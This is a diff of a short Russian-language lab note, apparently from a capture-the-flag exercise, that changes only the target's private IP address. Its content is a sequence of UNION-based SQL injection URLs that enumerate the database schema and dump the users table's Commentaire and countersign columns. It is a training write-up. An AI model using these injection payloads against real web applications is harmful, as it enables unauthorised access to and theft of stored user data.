@@ -1,12 +1,12 @@
-URL:http://192.168.43.236/?page=member
+URL:http://192.168.1.68/?page=member
 
 оценим структуру базы данных, в schemata - список баз данных, в tables - список таблиц, в columns - список колонок таблицы
 используем union для формирования запросов
 
-http://192.168.43.236/?page=member&id=21 union select database(), schema_name from information_schema.schemata &Submit=Submit
-http://192.168.43.236/?page=member&id=21 union select table_name, create_time from information_schema.tables where table_schema=database() &Submit=Submit
-http://192.168.43.236/?page=member&id=21 union select column_name, column_type from information_schema.columns where table_schema=database()&Submit=Submit
-http://192.168.43.236/?page=member&id=21 union select Commentaire, countersign from users &Submit=Submit
+http://192.168.1.68/?page=member&id=21 union select database(), schema_name from information_schema.schemata &Submit=Submit
+http://192.168.1.68/?page=member&id=21 union select table_name, create_time from information_schema.tables where table_schema=database() &Submit=Submit
+http://192.168.1.68/?page=member&id=21 union select column_name, column_type from information_schema.columns where table_schema=database()&Submit=Submit
+http://192.168.1.68/?page=member&id=21 union select Commentaire, countersign from users &Submit=Submit
 
 
 видим такое 
